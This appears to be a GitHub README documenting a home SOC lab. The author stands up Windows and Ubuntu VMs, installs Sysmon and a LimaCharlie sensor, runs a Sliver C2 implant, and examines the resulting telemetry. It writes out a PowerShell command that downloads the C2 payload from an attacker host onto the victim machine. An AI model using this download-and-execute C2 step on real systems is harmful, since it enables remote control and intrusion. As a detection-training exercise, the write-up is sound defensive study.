# SOC-Analyst

## Set up VMs environment
- I set up 2 VMs, one is Ubuntu Server 22.04, the other is Windows 10 Desktop
- After setting up completely, I install sysmon in Windows 10 VM by this following Powershell script steps
1. Download Sysmon
```powershell
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
```
2. Unzip Sysmon.zip
```powershell
Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
```
## Start to attack
- I use LimaCharlie (a SecOps cloud platform)
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/bdce3c63-38eb-42a6-81f6-626cfc5138e1)
- Follow these steps, and I reach this. It successfully creates the sensor
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/a9985c93-978d-4c3a-83d8-5d23d9e3f49b)
- Add rules to LimaCharlie
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/c60a1a58-90f5-49e8-9fc8-57e6c32b2feb)
- Use Sliver to perform Command and Control 
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/ed2188db-ed14-4deb-ba1e-04fbe77b4733)
- Download Command and Control file to Windows by this command
```powershell
IWR -Uri http://192.168.159.100/NORMAL_PUDDING.exe -Outfile C:\Users\hoang\Downloads\NORMAL_PUDDING.exe
```
- After running C2 on Windows VM, on Ubuntu Server, I see this
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/33fc3013-56ff-4faf-8156-b509c7033f27)
- Perform RCE
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/6335a1a3-c0a5-4ee5-aa38-a7144931a26d)

## Observe and analyse 
- As we can see here, the C2 payload is malicious processes, so they are not signed and they are active on network
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/f34352b8-d9c6-4f33-a0d8-13837a7796bf)
- In the network tab, we can see the C2 payload NORMAL_PUDDING is established
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/e07f3d9a-3a6d-4aa1-aa01-064be6df2920)
- In the file system tab, we can inspect the malicious file on VirusTotal
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/42e58ff3-2bde-47f2-94b6-5e2960a68315)











